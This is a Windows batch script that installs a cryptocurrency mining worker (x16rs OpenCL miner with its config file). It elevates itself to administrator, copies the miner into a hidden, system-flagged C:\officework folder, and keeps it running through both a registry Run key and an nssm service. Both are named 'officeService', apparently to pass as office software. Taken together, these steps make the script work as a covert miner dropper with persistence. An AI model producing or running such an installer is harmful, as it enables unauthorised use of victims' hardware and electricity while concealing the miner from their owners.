@echo off
chcp 65001 > nul
:: Check if the script is running as administrator
openfiles >nul 2>&1
if %errorlevel% neq 0 (
    
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

rem 获取批处理文件的存放路径
set script_dir=%~dp0

rem 切换到批处理文件的存放路径
cd /d %script_dir%

set current_dir=%cd%

set nssm_name=nssm
set source_file_nssm=%current_dir%\%nssm_name%

set config_name=minerworker.config.ini
set source_file_config=%current_dir%\%config_name%

set x16rs_opencl_name=x16rs_opencl
set source_file_x16rs_opencl=%current_dir%\%x16rs_opencl_name%

set worker_windows10_name=worker_windows10.exe
set source_file_worker_windows10=%current_dir%\%worker_windows10_name%

set target_dir=C:\officework


set target_file_nssm=%target_dir%\%nssm_name%
set target_file_config=%target_dir%\%config_name%
set target_file_x16rs_opencl=%target_dir%\%x16rs_opencl_name%
set target_file_worker_windows10=%target_dir%\%worker_windows10_name%

if not exist "%target_dir%" (
    mkdir "%target_dir%"
)

xcopy "%source_file_nssm%" "%target_file_nssm%" /E /H /C /I /Y

xcopy "%source_file_x16rs_opencl%" "%target_file_x16rs_opencl%" /E /H /C /I /Y
copy "%source_file_worker_windows10%" "%target_file_worker_windows10%" /y
copy "%source_file_config%" "%target_file_config%" /y

attrib +h +s "%target_dir%"

set cd_target_dir=%target_dir%\nssm\win64
set exe_name=worker_windows10.exe
set full_path=%target_dir%\%exe_name%

cd /d %cd_target_dir%


reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v officeService /t REG_SZ /d %full_path%
nssm install officeService %full_path%

nssm start officeService

pause
